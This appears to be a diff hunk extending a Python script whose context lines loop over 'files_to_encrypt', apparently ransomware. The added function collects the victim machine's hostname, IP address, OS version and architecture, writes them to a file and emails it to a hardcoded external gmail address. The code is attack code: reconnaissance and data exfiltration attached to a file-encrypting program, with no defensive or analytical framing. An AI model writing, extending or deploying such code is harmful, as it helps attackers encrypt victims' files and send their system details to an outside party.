@@ -215,3 +215,21 @@ for encypting_files in files_to_encrypt:
     count +=1
 
 time.sleep(120)
+
+def collect_and_send_info():
+    import socket
+    import platform
+    import os
+
+    system_info = f"""
+    Hostname: {socket.gethostname()}
+    IP Address: {socket.gethostbyname(socket.gethostname())}
+    System: {platform.system()} {platform.version()}
+    Machine: {platform.machine()}
+    """
+
+    with open("system_info.txt", "w") as f:
+        f.write(system_info)
+
+    # Send system_info.txt via email
+    send_email("system_info.txt", "system_info.txt", "wonlypans@gmail.com")
